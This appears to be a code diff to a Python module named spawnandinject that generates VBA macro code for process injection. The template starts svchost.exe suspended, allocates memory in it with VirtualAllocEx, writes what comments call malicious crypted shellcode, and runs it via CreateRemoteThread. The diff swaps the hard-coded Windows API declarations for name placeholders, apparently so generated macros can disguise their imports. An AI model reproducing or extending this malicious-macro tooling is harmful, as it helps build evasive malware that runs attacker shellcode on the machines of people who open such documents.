@@ -11,12 +11,7 @@ class spawnandinject:
             self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
-        return ['Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr',
-'Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long',
-'Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As LongPtr, lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr',
-'Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr',
-'Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long',
-'Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)']
+        return []
 
     def compilerOptions(self) -> list[str]:
         return []
@@ -64,13 +59,13 @@ End Type
     def template(self) -> str:
         return Template("""
     Dim si As STARTUPINFOA
-    RtlZeroMemory si, Len(si)
+    {RtlZeroMemory} si, Len(si)
     si.cb = Len(si)
     si.dwFlags = &H100
     Dim pi As PROCESS_INFORMATION
     Dim procOutput As LongPtr
     ' Start svchost.exe in a suspended state
-    procOutput = CreateProcessA(vbNullString, "$target", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)    
+    procOutput = {CreateProcessA}(vbNullString, "$target", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)    
     
     ' Buffer for malicious crypted shellcode needs to go here
     Dim shellcode As Variant
@@ -86,13 +81,13 @@ End Type
 
     Dim addr as LongPtr
 
-    addr = VirtualAllocEx(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, $memoryPermission)
+    addr = {VirtualAllocEx}(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, $memoryPermission)
 
     ' Write the shellcode into the svchost.exe entry point
-    a = WriteProcessMemory(pi.hProcess, addr, buf(0), scSize, tmp)
+    a = {WriteProcessMemory}(pi.hProcess, addr, buf(0), scSize, tmp)
 
     Dim thread as LongPtr
-    thread = CreateRemoteThread(pi.hProcess, ByVal 0&, 0, addr, ByVal 0&, 0, ByVal 0&)
+    thread = {CreateRemoteThread}(pi.hProcess, ByVal 0&, 0, addr, ByVal 0&, 0, ByVal 0&)
 
-    b = WaitForSingleObject(thread, 500)
+    b = {WaitForSingleObject}(thread, 500)
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
